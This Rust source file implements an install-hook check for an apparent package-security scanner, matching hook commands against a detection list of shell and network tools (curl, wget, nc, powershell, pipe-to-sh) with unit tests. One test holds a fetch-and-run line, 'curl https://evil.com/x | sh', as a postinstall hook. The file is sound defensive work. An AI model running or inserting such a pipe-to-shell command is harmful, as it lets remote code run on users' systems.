use crate::signals::Check;
use crate::types::{PackageIntel, PolicyConfig, Signal};

pub struct HookCheck {
    pub patterns: Vec<String>,
}

impl Default for HookCheck {
    fn default() -> Self {
        Self {
            patterns: default_patterns(),
        }
    }
}

fn default_patterns() -> Vec<String> {
    let risky_1 = "ev".to_string() + "al(";
    let risky_2 = "child_pro".to_string() + "cess";
    let risky_3 = "exe".to_string() + "cSync";
    let risky_4 = "spa".to_string() + "wn(";
    vec![
        "curl".into(),
        "wget".into(),
        "| sh".into(),
        "| bash".into(),
        risky_1,
        risky_2,
        risky_3,
        risky_4,
        "base64 -d".into(),
        "/bin/sh".into(),
        "/bin/bash".into(),
        "nc ".into(),
        "ncat ".into(),
        "Invoke-Expression".into(),
        "IEX".into(),
        "powershell".into(),
        "python -c".into(),
        "node -e".into(),
        "http://".into(),
        "https://".into(),
    ]
}

impl Check for HookCheck {
    fn name(&self) -> &'static str {
        "hook"
    }

    fn evaluate(&self, intel: &PackageIntel, _config: &PolicyConfig) -> Vec<Signal> {
        let mut out = Vec::new();
        for h in &intel.install_hooks {
            let lower = h.command.to_lowercase();
            for p in &self.patterns {
                if lower.contains(&p.to_lowercase()) {
                    out.push(Signal::HookCheck {
                        stage: h.stage.clone(),
                        reason: format!("matches '{}'", p),
                    });
                    break;
                }
            }
        }
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::InstallHook;

    #[test]
    fn clean_build_hook_no_signal() {
        let intel = PackageIntel {
            install_hooks: vec![InstallHook {
                stage: "build".into(),
                command: "tsc --project tsconfig.json".into(),
            }],
            ..Default::default()
        };
        assert!(HookCheck::default()
            .evaluate(&intel, &PolicyConfig::default())
            .is_empty());
    }

    #[test]
    fn curl_pipe_sh_fires() {
        let intel = PackageIntel {
            install_hooks: vec![InstallHook {
                stage: "postinstall".into(),
                command: "curl https://evil.com/x | sh".into(),
            }],
            ..Default::default()
        };
        let out = HookCheck::default().evaluate(&intel, &PolicyConfig::default());
        assert_eq!(out.len(), 1);
    }
}
